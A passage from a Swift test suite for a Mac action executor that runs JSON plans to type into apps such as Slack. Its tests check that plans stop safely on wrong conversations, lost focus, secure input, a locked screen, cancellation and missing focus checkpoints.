               "a plan stops when its app never comes forward — and another turn may retry")
        expect(stuck.typed.isEmpty, "nothing is typed when focus was never established")

        // 2. The wrong conversation is open → stop before the message is typed.
        let wrongChat = FakeActionHost()
        wrongChat.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        wrongChat.windowTitle = "Priya Sharma (DM) - Slack"
        wrongChat.elementLabel = "Message Priya Sharma"
        let wrongResult = ActionExecutor(host: wrongChat).run(plan)
        if case .failed(let step, _, _) = wrongResult.outcome {
            // Step 5 is the verify that now guards the switcher's Return —
            // it fires before anything is committed.
            expect(step == 5, "verify_context is what fails, at its own step")
        } else {
            expect(false, "the wrong conversation must fail the plan, got \(wrongResult.outcome)")
        }
        expect(wrongChat.typed == ["Himesh"],
               "only the switcher query was typed — the message never reached the wrong person")

        // 3. The user switches apps mid-plan → the remaining input is refused.
        let stolen = FakeActionHost()
        stolen.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        stolen.windowTitle = "Himesh Singh (DM) - Slack"
        stolen.frontmostAfterReads = (reads: 4, value: ("Mail", "com.apple.mail"))
        let stolenResult = ActionExecutor(host: stolen).run(plan)
        expect(!stolenResult.outcome.isSuccess,
               "losing focus mid-plan fails the plan instead of typing into the new app")
        expect(!stolen.typed.contains("running five late"),
               "the message body never lands in the app that stole focus")

        // 4. Secure input (a password field) is up → no keystrokes at all.
        let secure = FakeActionHost()
        secure.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        secure.windowTitle = "Himesh Singh (DM) - Slack"
        secure.canPostInput = false
        let secureResult = ActionExecutor(host: secure).run(plan)
        expect(!secureResult.outcome.isSuccess, "a plan fails while secure input is active")
        expect(secure.typed.isEmpty && secure.keys.isEmpty,
               "no keystroke is synthesized while secure input is active")

        // 4b. A locked Mac fails the plan up front, and says so. Found in the
        // field: with the screen locked the run failed at wait_frontmost with
        // "TextEdit didn't come to the front", sending the user after a bug
        // that was really just a locked screen.
        let locked = FakeActionHost()
        locked.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        locked.windowTitle = "Himesh Singh (DM) - Slack"
        locked.screenIsLocked = true
        let lockedResult = ActionExecutor(host: locked).run(plan)
        expect(lockedResult.outcome == .failed(step: 0, reason: "the screen is locked",
                                               recoverable: false),
               "a locked screen fails the plan with an honest reason")
        expect(locked.log.isEmpty, "a locked screen stops the plan before it opens anything")

        // 4c. Nothing focused to type into. Found in the field: "open TextEdit
        // and type hello" reported COMPLETED with "type_text 17 chars" while
        // TextEdit had zero documents — the characters went nowhere and the run
        // claimed success. A step that cannot land must fail.
        let noTarget = FakeActionHost()
        noTarget.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        noTarget.windowTitle = "Himesh Singh (DM) - Slack"
        noTarget.hasTextTarget = false
        let noTargetResult = ActionExecutor(host: noTarget).run(plan)
        expect(!noTargetResult.outcome.isSuccess,
               "typing with nothing focused fails instead of reporting success")
        expect(noTarget.typed.isEmpty,
               "no characters are sent when there is nowhere for them to land")

        // 5. Cancel is honoured between steps.
        let cancelHost = FakeActionHost()
        cancelHost.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        cancelHost.windowTitle = "Himesh Singh (DM) - Slack"
        let cancelExecutor = ActionExecutor(host: cancelHost)
        cancelExecutor.cancel()
        let cancelled = cancelExecutor.run(plan)
        expect(cancelled.outcome == .cancelled(step: 0), "a cancelled plan runs no steps")
        expect(cancelHost.log.isEmpty, "cancelling before the first step touches nothing")

        // 5b. Cancelling mid-flight (what Esc does) stops before the message.
        let midHost = FakeActionHost()
        midHost.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        midHost.windowTitle = "Himesh Singh (DM) - Slack"
        let midExecutor = ActionExecutor(host: midHost)
        midHost.onStep = { step in
            // Cancel the moment the switcher query has been typed.
            if step == "type(Himesh)" { midExecutor.cancel() }
        }
        let midResult = midExecutor.run(plan)
        if case .cancelled = midResult.outcome {
            expect(true, "a mid-flight cancel stops the plan")
        } else {
            expect(false, "Esc must stop a running plan, got \(midResult.outcome)")
        }
        expect(!midHost.typed.contains("running five late"),
               "cancelling before the body means nothing is sent")

        // 6. The app in the plan does not exist on this Mac.
        let missing = FakeActionHost()
        let missingResult = ActionExecutor(host: missing).run(plan)
        if case .failed(let step, _, _) = missingResult.outcome {
            expect(step == 0, "an unknown app fails at the open step")
        } else {
            expect(false, "an unknown app must fail the plan")
        }

        // 6b. Re-activating an app mid-plan invalidates the checkpoint. Without
        // this, `open_app` left the expected bundle id nil, and a nil id turns
        // OFF the per-chunk target check inside TextInserter — so the whole
        // message would type with no mid-typing abort.
        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"open_app","app":"Slack"},
          {"do":"type_text","text":"leak"}]}
        """) == .inputBeforeFocus(step: 2),
        "re-opening an app requires a fresh focus checkpoint before typing")

        // 7. A URL hand-off does not count as focus for later typing.
        let handoff = decodePlan("""
        {"sends":false,"steps":[
          {"do":"wait_frontmost","app":"Slack"},
          {"do":"open_url","url":"https://example.com"},
          {"do":"type_text","text":"leak"}]}
        """)
        let handoffHost = FakeActionHost()
        handoffHost.frontmost = ("Slack", "com.tinyspeck.slackmacgap")
        if let handoff {
            let result = ActionExecutor(host: handoffHost).run(handoff)
            expect(!result.outcome.isSuccess,
                   "opening a URL drops focus, so the following type_text is refused")
            expect(handoffHost.typed.isEmpty, "nothing is typed after a URL hand-off")
        } else {
            expect(false, "the hand-off plan decodes")
        }
    }

    // MARK: - Helpers

    static func decodePlan(_ json: String) -> ActionPlan? {
        guard let data = json.data(using: .utf8),
              let object = try? JSONSerialization.jsonObject(with: data) else { return nil }
        return try? ActionPlan.decode(object)
    }

    static func decodePlanError(_ json: String) -> ActionPlanError? {
        guard let data = json.data(using: .utf8),
              let object = try? JSONSerialization.jsonObject(with: data) else { return nil }
        do {
            _ = try ActionPlan.decode(object)
            return nil
        } catch let error as ActionPlanError {
            return error
        } catch {
            return nil
        }
    }

    static func decodeBatch(_ json: String,
                            state: inout ActionPlan.BatchState) -> ActionPlan? {
        guard let data = json.data(using: .utf8),
              let object = try? JSONSerialization.jsonObject(with: data) else { return nil }
        return try? ActionPlan.decode(object, state: &state)
    }

    static func decodeBatchError(_ json: String,
                                 state: inout ActionPlan.BatchState) -> ActionPlanError? {
        guard let data = json.data(using: .utf8),
              let object = try? JSONSerialization.jsonObject(with: data) else { return nil }
        do {
            _ = try ActionPlan.decode(object, state: &state)
            return nil
        } catch let error as ActionPlanError {
            return error
        } catch {
            return nil
        }
    }

    /// The plan used across the executor tests: the Slack DM shape.
    static let slackPlanJSON = """
    {"goal":"message Himesh","sends":true,"steps":[
      {"do":"open_app","app":"Slack"},
      {"do":"wait_frontmost","app":"Slack"},
      {"do":"key","key":"k","mods":["cmd"]},
      {"do":"type_text","text":"Himesh"},
      {"do":"pause","ms":600},
      {"do":"verify_context","expect":["Himesh"]},
      {"do":"key","key":"return"},
      {"do":"verify_context","expect":["Himesh"]},
      {"do":"type_text","text":"running five late"},
      {"do":"verify_context","expect":["Himesh"]},
      {"do":"key","key":"return"}
    ]}
    """

    /// The same flow in draft form: a draft NEVER presses Return once text
    /// is pending — it opens the conversation by pressing the person's row.
    static let slackDraftPlanJSON = """
    {"goal":"draft a message to Himesh","sends":false,"steps":[
      {"do":"open_app","app":"Slack"},
      {"do":"wait_frontmost","app":"Slack"},
      {"do":"key","key":"k","mods":["cmd"]},
      {"do":"type_text","text":"Himesh"},
      {"do":"pause","ms":600},
      {"do":"verify_context","expect":["Himesh"]},
      {"do":"press_element","label":"Himesh Singh"},
      {"do":"verify_context","expect":["Himesh"]},
      {"do":"type_text","text":"running five late"}
    ]}
    """
}
